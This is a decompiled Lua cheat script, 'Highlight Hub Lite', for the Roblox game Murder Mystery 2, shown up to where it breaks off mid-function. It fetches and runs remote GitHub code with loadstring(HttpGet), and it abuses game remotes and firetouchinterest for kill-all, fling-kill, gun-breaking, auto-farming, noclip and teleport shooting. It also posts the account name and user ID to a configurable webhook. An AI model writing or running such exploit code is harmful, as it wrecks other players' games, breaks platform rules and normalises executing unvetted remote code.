repeat
	task.wait()
until game:IsLoaded()
local v_u_1 = game:GetService("Players")
local v_u_2 = v_u_1.LocalPlayer
local v_u_3 = tonumber(string.match(v_u_2["CharacterAppearance\0"], "userId=(%d+)"))
local v_u_4 = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local v_u_5 = game["PlaceId\0"]
local v_u_6 = game.JobId
if not v_u_5 == 142823291 or (not v_u_5 == 335132309 or not v_u_5 == 636649648) then
	v_u_4:Notify({
		["Title"] = "Highlight Hub Lite",
		["Content"] = "This game isn\'t supported by the script.",
		["Duration"] = 3
	})
	task.wait(3)
	v_u_4:Destroy()
	return
else
	if getgenv().HLL_LOADED then
		v_u_4:Notify({
			["Title"] = "Highlight Hub Lite",
			["Content"] = "You already executed the script.",
			["Duration"] = 3
		})
	end
	if not firetouchinterest then
		v_u_4:Notify({
			["Title"] = "Highlight Hub Lite",
			["Content"] = "Your executor doesn\'t support firetouchinterest, you might crash while using the script.",
			["Duration"] = 3
		})
	end
	getgenv().HLL_LOADED = true
	local v_u_7 = game:GetService("Workspace")
	local v_u_8 = game:GetService("HttpService")
	local v_u_9 = game:GetService("TeleportService")
	local v_u_10 = game:GetService("ReplicatedStorage")
	local v_u_11 = game:GetService("RunService")
	local v_u_12 = game:GetService("GuiService")
	local v_u_13 = game:GetService("TweenService")
	game:GetService("Stats")
	local v_u_14 = game:GetService("VirtualUser")
	local v_u_15 = http and http.request or http_request or (request or HttpPost)
	local v_u_16 = v_u_2.Character or v_u_2.CharacterAdded:Wait()
	local v_u_17 = v_u_16:WaitForChild("Humanoid")
	local v_u_18 = v_u_16:WaitForChild("HumanoidRootPart")
	v_u_2:GetMouse()
	local _ = v_u_7.CurrentCamera.WorldToViewportPoint
	local v_u_19 = {
		["Noclip"] = false,
		["FloatVector"] = -3.05,
		["Float"] = false,
		["CameraNoclip"] = false,
		["UnlockCamera"] = false,
		["SecondLife"] = false,
		["AutoBreakGun"] = false,
		["NoGUI"] = false,
		["DestroyBarriers"] = false,
		["DestroyDisplay"] = false,
		["DestroyDeadBody"] = false,
		["HiddenGUIS"] = {},
		["AutoFarmInfo"] = {
			["Status"] = "Off",
			["Description"] = nil
		},
		["AutoFarmVariable"] = {
			["IsBagFull"] = false,
			["RoundEnded"] = false,
			["IsAlive"] = false,
			["FTH"] = false
		},
		["AutoFarmChoice"] = "Coin",
		["XPFarm"] = false,
		["CoinFarm"] = false,
		["BoxToOpen"] = "MysteryBox1",
		["AutoUnbox"] = false,
		["AutoPrestige"] = false,
		["CoinType"] = "BeachBall",
		["TweenSpeed"] = 19,
		["AutoFarmDelay"] = 0,
		["InstantTPIfTooFar"] = 300,
		["TriesBeforeSkip"] = 400,
		["CoinAuraDistance"] = 10,
		["CoinAura"] = false,
		["TweenUnder"] = false,
		["ToDoWhenDone"] = "Reset",
		["AutoFarmMode"] = "Normal",
		["Webhook"] = nil,
		["AutoUnboxNotify"] = false,
		["KickNotify"] = false,
		["RejoinWhenKicked"] = false,
		["ServerHopWhenEmpty"] = false,
		["ServerHopWhenEmptyConnect"] = nil,
		["ServerHopAfter"] = 10,
		["AutoServerHop"] = false,
		["CameraNoclipEnabled"] = false,
		["UnlockCameraEnabled"] = false,
		["NoGUIEnabled"] = false,
		["SecondLifeEnabled"] = false,
		["CoinFarmEnabled"] = false
	}
	local v_u_20 = {
		["Knife"] = "Murderer",
		["Gun"] = "Sheriff"
	}
	local v_u_21 = {
		["Gameplay"] = {
			["Murderer"] = nil,
			["MurdererPerk"] = nil,
			["Sheriff"] = nil
		},
		["GameplayMap"] = {},
		["LevelConnect"] = nil,
		["Level"] = 0,
		["Prestige"] = 0,
		["CoinsPart"] = {},
		["Map"] = nil,
		["IsRoundStarting"] = false,
		["IsRoundStarted"] = false
	}
	local v_u_22 = {
		["AutoFarmToggle"] = nil,
		["FarmSettingsSection"] = nil,
		["AutoFarmInfoDesc"] = nil
	}
	local v_u_23 = {
		["CoinAdded"] = nil,
		["CoinRemoved"] = nil,
		["CoinRemoved2"] = nil
	}
	function DateTime()
		local v24 = os.date("!*t", os.time())
		return string.format("%d-%d-%dT%02d:%02d:%02dZ", v24.year, v24.month, v24.day, v24.hour, v24.min, v24.sec)
	end
	function SendUnboxWebhook(p25, p26)
		-- upvalues: (ref) v_u_10, (ref) v_u_2, (ref) v_u_8, (ref) v_u_15
		local v27 = {}
		local v28 = v_u_10.GetSyncData:InvokeServer().Item[p26]
		local v29 = v28.ItemType
		local v30 = v28.Rarity
		local v31 = v28.Event
		local v32 = v28.Image:match("assetId=(%d+)")
		table.insert(v27, "Account Name: ||" .. v_u_2.Name .. "||")
		table.insert(v27, "Unboxed: " .. p26)
		table.insert(v27, "Type: " .. v29)
		table.insert(v27, "Rarity: " .. v30)
		table.insert(v27, "Event: " .. (v31 or "None"))
		local v33 = {
			["username"] = "Highlight Hub Lite",
			["content"] = v30 == "Godly" and "@everyone" or ""
		}
		local v34 = {}
		local v35 = {
			["color"] = ({
				["Common"] = 12369084,
				["UnCommon"] = 2721484,
				["Rare"] = 4313344,
				["Legendary"] = 16007990,
				["Godly"] = 16730792
			})[v30],
			["title"] = "Auto Unbox"
		}
		local v36 = {
			["url"] = v_u_8:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" .. v32 .. "&size=250x250&format=Png&isCircular=false")).data[1].imageUrl
		}
		v35.thumbnail = v36
		v35.description = "**" .. table.concat(v27, "\n") .. "**"
		v35.timestamp = DateTime()
		v35.footer = {
			["text"] = "Highlight Hub Lite"
		}
		__set_list(v34, 1, {v35})
		v33.embeds = v34
		v_u_15({
			["Url"] = p25,
			["Method"] = "POST",
			["Headers"] = {
				["Content-Type"] = "application/json"
			},
			["Body"] = v_u_8:JSONEncode(v33)
		})
	end
	function SendWebhook(_, p37)
		-- upvalues: (ref) v_u_2, (ref) v_u_3, (ref) v_u_15, (ref) v_u_8
		local v38 = {}
		table.insert(v38, "Username: " .. v_u_2.Name)
		table.insert(v38, "User Id: " .. v_u_3)
		table.insert(v38, p37)
		local v_u_39 = {
			["username"] = "Highlight Hub Lite"
		}
		local v40 = {}
		local v41 = {
			["color"] = 13187017,
			["title"] = "Notify",
			["description"] = "**" .. table.concat(v38, "\n") .. "**",
			["timestamp"] = DateTime(),
			["footer"] = {
				["text"] = "Highlight Hub Lite"
			}
		}
		__set_list(v40, 1, {v41})
		v_u_39.embeds = v40
		local _, _ = pcall(function()
			-- upvalues: (ref) v_u_15, (ref) v_u_8, (ref) v_u_39
			local v42 = v_u_15
			local v43 = {
				["Url"] = webhook,
				["Method"] = "POST",
				["Headers"] = {
					["Content-Type"] = "application/json"
				},
				["Body"] = v_u_8:JSONEncode(v_u_39)
			}
			return v42(v43)
		end)
	end
	local v44 = loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/main/BetterSaveManager.lua"))()
	local v45 = loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/main/BetterInterfaceManager.lua"))()
	if not v_u_2:WaitForChild("PlayerGui"):FindFirstChild("MainGUI") then
		v_u_4:Notify({
			["Title"] = "Highlight Hub Lite",
			["Content"] = "Waiting for MainGUI.",
			["Duration"] = 5
		})
		repeat
			task.wait()
			local v46 = v_u_2
		until v_u_2.WaitForChild(v46, "PlayerGui"):FindFirstChild("MainGUI")
	end
	function Rejoin()
		-- upvalues: (ref) v_u_1, (ref) v_u_9, (ref) v_u_5, (ref) v_u_2, (ref) v_u_6
		if #v_u_1:GetPlayers() > 1 then
			v_u_9:TeleportToPlaceInstance(v_u_5, v_u_6, v_u_2)
		else
			v_u_9:Teleport(v_u_5, v_u_2)
		end
	end
	function ServerHop()
		-- upvalues: (ref) v_u_5, (ref) v_u_8, (ref) v_u_9, (ref) v_u_2
		local v47 = v_u_5
		local v_u_48 = "https://games.roblox.com/v1/games/" .. v47 .. "/servers/Public?sortOrder=Asc&limit=100"
		function ListServers(p49)
			-- upvalues: (ref) v_u_48, (ref) v_u_8
			return v_u_8:JSONDecode((game:HttpGet(v_u_48 .. (p49 and "&cursor=" .. p49 or ""))))
		end
		local v50 = nil
		repeat
			local v51 = ListServers(v50)
			local v52 = v51.data[1]
			v50 = v51.nextPageCursor
		until v52
		v_u_9:TeleportToPlaceInstance(v47, v52.id, v_u_2)
	end
	function SetRole(p53, p54)
		-- upvalues: (ref) v_u_21
		local v55 = v_u_21.Gameplay[p54]
		if v55 then
			if p53 == v55 then
				return
			end
			local v56 = v_u_21.Gameplay[p54]
			v_u_21.GameplayMap[v56.Name] = nil
		end
		v_u_21.Gameplay[p54] = p53
		v_u_21.GameplayMap[p53.Name] = p54
	end
	function GetRoles()
		-- upvalues: (ref) v_u_10, (ref) v_u_1
		local v57 = v_u_10.Remotes.Extras.GetPlayerData:InvokeServer()
		local v58, v59, v60 = pairs(v57)
		while true do
			local v61
			v60, v61 = v58(v59, v60)
			if v60 == nil then
				break
			end
			if v61.Role ~= "Innocent" then
				local v62 = v_u_1:FindFirstChild(v60)
				if v62 then
					SetRole(v62, v61.Role)
				end
			end
		end
	end
	function CheckTool(p63)
		-- upvalues: (ref) v_u_1, (ref) v_u_20, (ref) v_u_21, (ref) v_u_2
		local v64 = p63:FindFirstAncestorOfClass("Player") or v_u_1:GetPlayerFromCharacter(p63:FindFirstAncestorOfClass("Model"))
		if v64 then
			SetRole(v64, v_u_20[p63.Name])
			if v_u_21.Gameplay.Sheriff == v_u_2.Name then
				local v65 = v_u_1
				local v66, v67, v68 = pairs(v65:GetPlayers())
				while true do
					local v69
					v68, v69 = v66(v67, v68)
					if v68 == nil then
						break
					end
					FixMemoryLeak(v69)
				end
			end
		end
	end
	local v70 = { v_u_7, v_u_1 }
	local v71, v72, v73 = pairs(v70)
	while true do
		local v74
		v73, v74 = v71(v72, v73)
		if v73 == nil then
			break
		end
		local v75, v76, v77 = pairs(v74:GetDescendants())
		while true do
			local v78, v79 = v75(v76, v77)
			if v78 == nil then
				break
			end
			v77 = v78
			if v79:IsA("Tool") and (v79.Name == "Knife" or v79.Name == "Gun") then
				CheckTool(v79)
			end
		end
	end
	if not (v_u_21.Gameplay.Murderer and v_u_21.Gameplay.Sheriff) then
		GetRoles()
	end
	local v_u_80 = nil
	function CreateFloat()
		-- upvalues: (ref) v_u_80, (ref) v_u_7
		v_u_80 = Instance.new("Part", v_u_7)
		v_u_80.Name = "Float Part"
		v_u_80.Size = Vector3.new(6, 0.1, 6)
		v_u_80.Anchored = true
		v_u_80.Transparency = 1
	end
	function DestroyFloat()
		-- upvalues: (ref) v_u_80
		if v_u_80 then
			v_u_80:Destroy()
			v_u_80 = nil
		end
	end
	local v_u_81 = {}
	v_u_11.Stepped:Connect(function()
		-- upvalues: (ref) v_u_19, (ref) v_u_16, (ref) v_u_81, (ref) v_u_80, (ref) v_u_18
		pcall(function()
			-- upvalues: (ref) v_u_19, (ref) v_u_16, (ref) v_u_81, (ref) v_u_80, (ref) v_u_18
			if v_u_19.Noclip and v_u_16 then
				local v82 = v_u_16
				local v83, v84, v85 = pairs(v82:GetDescendants())
				while true do
					local v86
					v85, v86 = v83(v84, v85)
					if v85 == nil then
						break
					end
					if v86:IsA("BasePart") and v86.CanCollide then
						v86.CanCollide = false
						v_u_81[v86] = true
					end
				end
			else
				local v87, v88, v89 = pairs(v_u_81)
				while true do
					local v90
					v89, v90 = v87(v88, v89)
					if v89 == nil then
						break
					end
					v_u_81[v89] = nil
					v89.CanCollide = true
				end
			end
			if v_u_19.Float and not v_u_80 then
				CreateFloat()
			end
			if not v_u_19.Float and v_u_80 then
				DestroyFloat()
			end
			if v_u_19.Float and (v_u_18 and v_u_80) then
				v_u_80.CFrame = v_u_18.CFrame + Vector3.new(0, v_u_19.FloatVector, 0)
			end
		end)
	end)
	function GetLevel(p91)
		-- upvalues: (ref) v_u_21, (ref) v_u_1
		if p91 then
			return v_u_1:FindFirstChild(p91):GetAttribute("Level")
		else
			return v_u_21.Level
		end
	end
	function GetPrestige(p92)
		-- upvalues: (ref) v_u_21, (ref) v_u_1
		if p92 then
			return v_u_1:FindFirstChild(p92):GetAttribute("Prestige")
		else
			return v_u_21.Prestige
		end
	end
	function Prestige()
		-- upvalues: (ref) v_u_10
		v_u_10.Remotes.Inventory.Prestige:FireServer()
	end
	function GetTimer()
		-- upvalues: (ref) v_u_10
		return v_u_10.Remotes.Extras.GetTimer:InvokeServer()
	end
	local v93 = GetTimer()
	v_u_21.IsRoundStarted = v93 < 180 and v93 > 0
	v_u_21.IsRoundStarting = v93 == 180
	function IsElite()
		-- upvalues: (ref) v_u_3, (ref) v_u_10
		return MarketplaceService:UserOwnsGamePassAsync(v_u_3, 429957) or v_u_10.Remotes.Extras.AmElite:InvokeServer()
	end
	function IsAlive(p94)
		-- upvalues: (ref) v_u_2, (ref) v_u_10
		local v95 = p94 or v_u_2.Name
		local v96 = v_u_10.Remotes.Extras.GetPlayerData:InvokeServer()[v95]
		if not v96 then
			return false
		end
		local v97
		if v96.Killed then
			v97 = false
		else
			v97 = not v96.Dead
		end
		return v97
	end
	function IsCoinBagFull()
		-- upvalues: (ref) v_u_2
		if v_u_2.PlayerGui.MainGUI.Game:FindFirstChild("CoinBags") then
			return v_u_2.PlayerGui.MainGUI.Game.CoinBags.Container.Coin.Full.Visible
		else
			return v_u_2.PlayerGui.MainGUI.Lobby.Dock.CoinBags.Container.Coin.FullBagIcon.Visible
		end
	end
	function IsBeachBallBagFull()
		-- upvalues: (ref) v_u_2
		if v_u_2.PlayerGui.MainGUI.Game:FindFirstChild("CoinBags") then
			return v_u_2.PlayerGui.MainGUI.Game.CoinBags.Container.BeachBall.Full.Visible
		else
			return v_u_2.PlayerGui.MainGUI.Game.CoinBags.Container.BeachBall.FullBagIcon.Visible
		end
	end
	function GetCoins(p98)
		-- upvalues: (ref) v_u_10
		if p98 == "Coin" then
			return v_u_10.Remotes.Extras.GetData2:InvokeServer().Coins
		end
		if p98 == "BeachBall" then
			return v_u_10.Remotes.Extras.GetData2:InvokeServer().Materials.Owned.BeachBalls2025 or 0
		end
	end
	function GetMurdererPerk()
		-- upvalues: (ref) v_u_21, (ref) v_u_10
		if v_u_21.Gameplay.Murderer then
			return v_u_10.Remotes.Extras.GetPlayerData:InvokeServer()[tostring(v_u_21.Gameplay.Murderer)].Effect
		end
	end
	function TeleportTo(p_u_99)
		-- upvalues: (ref) v_u_7, (ref) v_u_18, (ref) v_u_21
		pcall(function()
			-- upvalues: (ref) p_u_99, (ref) v_u_7, (ref) v_u_18, (ref) v_u_21
			if p_u_99 == "Lobby" then
				local v100 = v_u_7.Lobby.Lobby
				v_u_18.CFrame = CFrame.new(v100.Spawns:GetChildren()[math.random(1, #v100.Spawns:GetChildren())].Position + Vector3.new(0, v_u_18.Size.Y / 2, 0))
			end
			if p_u_99 == "Map" and v_u_21.Map then
				local v101 = v_u_21.Map:FindFirstChild("Spawns")
				if v101 and #v101:GetChildren() > 0 then
					v_u_18.CFrame = CFrame.new(v101:GetChildren()[math.random(1, #v101:GetChildren())].Position + Vector3.new(0, v_u_18.Size.Y / 2, 0))
				end
			end
		end)
	end
	function Unbox(p102)
		-- upvalues: (ref) v_u_10
		v_u_10.Remotes.Shop.OpenCrate:InvokeServer(unpack({ p102, "MysteryBox", "Coins" }))
	end
	function Stab()
		-- upvalues: (ref) v_u_16
		v_u_16.Knife.Stab:FireServer()
	end
	function KillPlayer(p_u_103, p_u_104)
		-- upvalues: (ref) v_u_1, (ref) v_u_21, (ref) v_u_2, (ref) v_u_16
		task.spawn(function()
			-- upvalues: (ref) v_u_1, (ref) p_u_103, (ref) v_u_21, (ref) v_u_2, (ref) v_u_16, (ref) p_u_104
			local v105 = v_u_1:FindFirstChild(p_u_103)
			if tostring(v_u_21.Gameplay.Murderer) == v_u_2.Name and (v105 and IsAlive(p_u_103)) then
				if not v_u_16:FindFirstChild("Knife") and p_u_104 then
					EquipTool("Knife")
				end
				local v106 = v105.Character
				if v106 then
					v106 = v106:FindFirstChild("HumanoidRootPart")
				end
				if v106 and v_u_16.Knife then
					task.wait()
					if p_u_104 then
						Stab()
					end
					firetouchinterest(v106, v_u_16.Knife.Handle, 1)
					firetouchinterest(v106, v_u_16.Knife.Handle, 0)
				end
			end
		end)
	end
	function KillAll()
		-- upvalues: (ref) v_u_21, (ref) v_u_2, (ref) v_u_1, (ref) v_u_16
		task.spawn(function()
			-- upvalues: (ref) v_u_21, (ref) v_u_2, (ref) v_u_1, (ref) v_u_16
			if tostring(v_u_21.Gameplay.Murderer) == v_u_2.Name then
				local v107 = v_u_1
				local v108, v109, v110 = ipairs(v107:GetPlayers())
				while true do
					local v111
					v110, v111 = v108(v109, v110)
					if v110 == nil then
						break
					end
					if v111 ~= v_u_2 and (not IsPlayerWhitelisted(v111.Name) and IsAlive(v111.Name)) then
						local v112 = v111.Character
						if v112 then
							v112 = v112:FindFirstChild("HumanoidRootPart")
						end
						if v112 then
							local v113 = v_u_16:FindFirstChild("Knife")
							if not v113 then
								EquipTool("Knife")
								v113 = v_u_16:FindFirstChild("Knife")
							end
							task.wait()
							Stab()
							firetouchinterest(v112, v113.Handle, 1)
							firetouchinterest(v112, v113.Handle, 0)
						end
					end
				end
			end
		end)
	end
	function ShootGun(p_u_114)
		-- upvalues: (ref) v_u_16
		task.spawn(function()
			-- upvalues: (ref) p_u_114, (ref) v_u_16
			local v115 = { 1, p_u_114, "AH" }
			v_u_16.Gun.KnifeServer.ShootGun:InvokeServer(unpack(v115))
		end)
	end
	function ShootMurderer()
		-- upvalues: (ref) v_u_21, (ref) v_u_16, (ref) v_u_18, (ref) v_u_1
		if v_u_21.Gameplay.Sheriff then
			local v116 = v_u_16:FindFirstChild("Gun")
			if not v116 then
				EquipTool("Gun")
				v116 = v_u_16:FindFirstChild("Gun")
			end
			if v116 then
				local v117 = v_u_18.Position
				v_u_18.CFrame = CFrame.new(v_u_1[tostring(v_u_21.Gameplay.Murderer)].Character.HumanoidRootPart.Position) * CFrame.new(0, 0, 5)
				task.wait(0.2)
				ShootGun(v_u_1[tostring(v_u_21.Gameplay.Murderer)].Character.HumanoidRootPart.Position)
				task.wait(0.1)
				v_u_18.CFrame = CFrame.new(v117)
			end
		end
	end
	local v_u_118 = false
	function GetPlayer(p119)
		-- upvalues: (ref) v_u_118, (ref) v_u_1, (ref) v_u_2
		local v120 = p119:lower()
		if v120 == "all" or v120 == "others" then
			v_u_118 = true
			return
		elseif v120 == "random" then
			local v121 = v_u_1:GetPlayers()
			if table.find(v121, v_u_2) then
				table.remove(v121, table.find(v121, v_u_2))
			end
			return v121[math.random(#v121)]
		elseif v120 ~= "random" and (v120 ~= "all" and v120 ~= "others") then
			local v122 = next
			local v123, v124 = v_u_1:GetPlayers()
			while true do
				local v125
				v124, v125 = v122(v123, v124)
				if v124 == nil then
					break
				end
				if v125 ~= v_u_2 then
					if v125.Name:lower():match("^" .. v120) then
						return v125
					end
					if v125.DisplayName:lower():match("^" .. v120) then
						return v125
					end
				end
			end
		end
	end
	function Fling(p_u_126)
		-- upvalues: (ref) v_u_7, (ref) v_u_16, (ref) v_u_17, (ref) v_u_18, (ref) v_u_118, (ref) v_u_1
		pcall(function()
			-- upvalues: (ref) p_u_126, (ref) v_u_7, (ref) v_u_16, (ref) v_u_17, (ref) v_u_18, (ref) v_u_118, (ref) v_u_1
			local v_u_127 = p_u_126.Character
			local v_u_128 = nil
			local v129 = nil
			local v130 = nil
			local v131 = nil
			local v132 = v_u_7.CurrentCamera.CameraSubject
			local v133 = v_u_7.FallenPartsDestroyHeight
			local v_u_134
			if v_u_127:FindFirstChildOfClass("Humanoid") then
				v_u_134 = v_u_127:FindFirstChildOfClass("Humanoid")
			else
				v_u_134 = nil
			end
			if v_u_134 and v_u_134.RootPart then
				v_u_128 = v_u_134.RootPart
			end
			if v_u_127:FindFirstChild("Head") then
				v129 = v_u_127.Head
			end
			if v_u_127:FindFirstChildOfClass("Accessory") then
				v130 = v_u_127:FindFirstChildOfClass("Accessory")
			end
			if v130 and v130:FindFirstChild("Handle") then
				v131 = v130.Handle
			end
			if v_u_16 and (v_u_17 and v_u_18) then
				if v_u_18.Velocity.Magnitude < 50 then
					getgenv().OldPos = v_u_18.CFrame
				end
				if v_u_134 and (v_u_134.Sit and not v_u_118) then
					return
				else
					if v129 then
						v_u_7.CurrentCamera.CameraSubject = v129
					elseif v129 or not v131 then
						if v_u_134 and v_u_128 then
							v_u_7.CurrentCamera.CameraSubject = v_u_134
						end
					else
						v_u_7.CurrentCamera.CameraSubject = v131
					end
					if v_u_127:FindFirstChildWhichIsA("BasePart") then
						function FPos(p135, p136, p137)
							-- upvalues: (ref) v_u_18, (ref) v_u_16
							v_u_18.CFrame = CFrame.new(p135.Position) * p136 * p137
							v_u_16:SetPrimaryPartCFrame(CFrame.new(p135.Position) * p136 * p137)
							v_u_18.Velocity = Vector3.new(90000000, 900000000, 90000000)
							v_u_18.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
						end
						function SFBasePart(p138)
							-- upvalues: (ref) v_u_18, (ref) v_u_134, (ref) v_u_128, (ref) p_u_126, (ref) v_u_1, (ref) v_u_127, (ref) v_u_17
							local v139 = tick()
							local v140 = 2
							local v141 = 0
							while v_u_18 and v_u_134 do
								if p138.Velocity.Magnitude >= 50 then
									FPos(p138, CFrame.new(0, 1.5, v_u_134.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, -1.5, -v_u_134.WalkSpeed), CFrame.Angles(0, 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, 1.5, v_u_134.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, 1.5, v_u_128.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, -1.5, -v_u_128.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, 1.5, v_u_128.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
									task.wait()
								else
									v141 = v141 + 100
									FPos(p138, CFrame.new(0, 1.5, 0) + v_u_134.MoveDirection * p138.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(v141), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, -1.5, 0) + v_u_134.MoveDirection * p138.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(v141), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(2.25, 1.5, -2.25) + v_u_134.MoveDirection * p138.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(v141), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(-2.25, -1.5, 2.25) + v_u_134.MoveDirection * p138.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(v141), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, 1.5, 0) + v_u_134.MoveDirection, CFrame.Angles(math.rad(v141), 0, 0))
									task.wait()
									FPos(p138, CFrame.new(0, -1.5, 0) + v_u_134.MoveDirection, CFrame.Angles(math.rad(v141), 0, 0))
									task.wait()
								end
								if p138.Velocity.Magnitude > 500 or (p138.Parent ~= p_u_126.Character or (p_u_126.Parent ~= v_u_1 or (not p_u_126.Character == v_u_127 or (v_u_134.Sit or (v_u_17.Health <= 0 or tick() > v139 + v140))))) then
									break
								end
							end
						end
						v_u_7.FallenPartsDestroyHeight = 0 / 0
						local v142 = Instance.new("BodyVelocity")
						v142.Name = "EpixVel"
						v142.Parent = v_u_18
						v142.Velocity = Vector3.new(900000000, 900000000, 900000000)
						v142.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
						v_u_17:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
						if v_u_128 and v129 then
							if (v_u_128.CFrame.p - v129.CFrame.p).Magnitude <= 5 then
								SFBasePart(v_u_128)
							else
								SFBasePart(v129)
							end
						elseif v_u_128 and not v129 then
							SFBasePart(v_u_128)
						elseif v_u_128 or not v129 then
							if v_u_128 or (v129 or not (v130 and v131)) then
								return
							end
							SFBasePart(v131)
						else
							SFBasePart(v129)
						end
						v142:Destroy()
						v_u_17:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
						repeat
							v_u_18.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
							v_u_16:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
							v_u_17:ChangeState("GettingUp")
							local v143 = v_u_16
							table.foreach(v143:GetChildren(), function(_, p144)
								if p144:IsA("BasePart") then
									local v145 = Vector3.new()
									p144.RotVelocity = Vector3.new()
									p144.Velocity = v145
								end
							end)
							task.wait()
						until (v_u_18.Position - getgenv().OldPos.p).Magnitude < 25
						v_u_7.FallenPartsDestroyHeight = v133
						v_u_7.CurrentCamera.CameraSubject = v132
					end
				end
			else
				return
			end
		end)
	end
	function FlingKill(p146)
		-- upvalues: (ref) v_u_118, (ref) v_u_1, (ref) v_u_2
		if p146 == "All" then
			v_u_118 = true
			local v147 = v_u_1
			local v148, v149, v150 = ipairs(v147:GetPlayers())
			while true do
				local v151
				v150, v151 = v148(v149, v150)
				if v150 == nil then
					break
				end
				if v151 ~= v_u_2 and not IsPlayerWhitelisted(v151.Name) then
					Fling(v151)
				end
			end
			v_u_118 = false
		else
			local v152 = GetPlayer(p146)
			if v152 and v152 ~= v_u_2 then
				Fling(v152)
			end
		end
	end
	function IsMapAvailable(p153)
		-- upvalues: (ref) v_u_7
		local v154 = v_u_7.Lobby.VoteIcons.VotePad1.MapInfo.Surface.Frame.MapName.Text
		local v155 = v_u_7.Lobby.VoteIcons.VotePad2.MapInfo.Surface.Frame.MapName.Text
		local v156 = v_u_7.Lobby.VoteIcons.VotePad3.MapInfo.Surface.Frame.MapName.Text
		return p153 == v154 or (p153 == v155 or p153 == v156)
	end
	function VoteMap(p157)
		-- upvalues: (ref) v_u_7, (ref) v_u_19, (ref) v_u_22, (ref) v_u_18
		if v_u_7.Lobby.VoteIcons.VotePad1.MapInfo.Surface.Enabled then
			local v158, v159, v160 = ipairs(p157)
			while true do
				local v161
				v160, v161 = v158(v159, v160)
				if v160 == nil then
					break
				end
				if IsMapAvailable(v161) then
					local v162
					if v_u_19.CoinFarm then
						v_u_22.AutoFarmToggle:SetValue(false)
						v162 = true
					else
						v162 = false
					end
					local v163 = v_u_18.Position
					if v161 ~= v_u_7.Lobby.VoteIcons.VotePad1.MapInfo.Surface.Frame.MapName.Text then
						if v161 ~= v_u_7.Lobby.VoteIcons.VotePad2.MapInfo.Surface.Frame.MapName.Text then
							if v161 == v_u_7.Lobby.VoteIcons.VotePad3.MapInfo.Surface.Frame.MapName.Text then
								v_u_18.CFrame = CFrame.new(v_u_7.Lobby.VotePads.Detector3.Position)
								task.wait(0.2)
								v_u_18.CFrame = CFrame.new(v163)
							end
						else
							v_u_18.CFrame = CFrame.new(v_u_7.Lobby.VotePads.Detector2.Position)
							task.wait(0.2)
							v_u_18.CFrame = CFrame.new(v163)
						end
					else
						v_u_18.CFrame = CFrame.new(v_u_7.Lobby.VotePads.Detector1.Position)
						task.wait(0.2)
						v_u_18.CFrame = CFrame.new(v163)
					end
					if v162 then
						v_u_22.AutoFarmToggle:SetValue(true)
					end
					break
				end
			end
		end
	end
	function EndRound()
		-- upvalues: (ref) v_u_21, (ref) v_u_2, (ref) v_u_17, (ref) v_u_16
		if v_u_21.IsRoundStarted or v_u_21.IsRoundStarting then
			if tostring(v_u_21.Gameplay.Murderer) ~= v_u_2.Name then
				if IsAlive() then
					v_u_17.Health = 0
					repeat
						task.wait()
					until v_u_16
				end
				FlingKill(tostring(v_u_21.Gameplay.Murderer))
			else
				KillAll()
			end
		end
	end
	function BreakGun()
		-- upvalues: (ref) v_u_21, (ref) v_u_2, (ref) v_u_1
		task.spawn(function()
			-- upvalues: (ref) v_u_21, (ref) v_u_2, (ref) v_u_1
			local _, _ = pcall(function()
				-- upvalues: (ref) v_u_21, (ref) v_u_2, (ref) v_u_1
				if v_u_21.Gameplay.Sheriff and tostring(v_u_21.Gameplay.Sheriff) ~= v_u_2.Name then
					local v164 = v_u_1[tostring(v_u_21.Gameplay.Sheriff)]
					(v164.Backpack:FindFirstChild("Gun") or v164.Character:FindFirstChild("Gun")).KnifeServer.ShootGun:InvokeServer(1, 0, "AH2")
				end
			end)
		end)
	end
	function CreatePlatform()
		-- upvalues: (ref) v_u_7
		if not v_u_7:FindFirstChild("Platform Part") then
			local v165 = Instance.new("Part", v_u_7)
			v165.Name = "Platform"
			v165.Size = Vector3.new(10, 1, 10)
			v165.Position = Vector3.new(0, 95, 0)
			v165.Anchored = true
		end
	end
	function AddCoinToTable(p166)
		-- upvalues: (ref) v_u_21
		if p166:IsA("Part") then
			local v167 = p166:GetAttribute("CoinID")
			table.insert(v_u_21.CoinsPart, {
				["Coin"] = p166,
				["Name"] = p166.Name,
				["Position"] = p166.Position,
				["CoinID"] = v167
			})
		end
	end
	function RemoveCoinToTable(p168)
		-- upvalues: (ref) v_u_21
		local v169, v170, v171 = ipairs(v_u_21.CoinsPart)
		while true do
			local v172
			v171, v172 = v169(v170, v171)
			if v171 == nil then
				break
			end
			if v172.Position == p168.Position then
